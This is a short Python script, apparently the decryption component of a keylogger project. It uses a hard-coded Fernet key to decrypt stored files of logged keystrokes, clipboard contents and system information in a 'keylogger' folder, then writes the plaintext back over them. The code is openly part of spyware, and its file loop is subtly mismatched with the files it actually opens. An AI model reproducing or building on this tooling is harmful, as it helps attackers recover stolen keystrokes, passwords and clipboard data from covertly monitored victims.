from cryptography.fernet import Fernet
import os

key = "Xlvkqx7w0GbPEHT3VHFcXbU6uLTROKaoL2jfIqF8Evk="

keys_info = "keys_info.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
dir_path = "E:\keylogger\info" # Enter the file path you want your files to be saved to


encrypted_files = [system_info, clipboard_info, keys_info]
count = 0

for encrypting_file in os.listdir("info"):

    if not encrypting_file.endswith(".txt"):
        continue
    
    with open(os.path.join(dir_path, encrypted_files[count]), 'rb') as f:
        data = f.read()

    fernet = Fernet("Xlvkqx7w0GbPEHT3VHFcXbU6uLTROKaoL2jfIqF8Evk=")
    decrypted = fernet.decrypt(data)

    with open(os.path.join(dir_path, encrypted_files[count]), 'wb') as f:
        f.write(decrypted)

    count += 1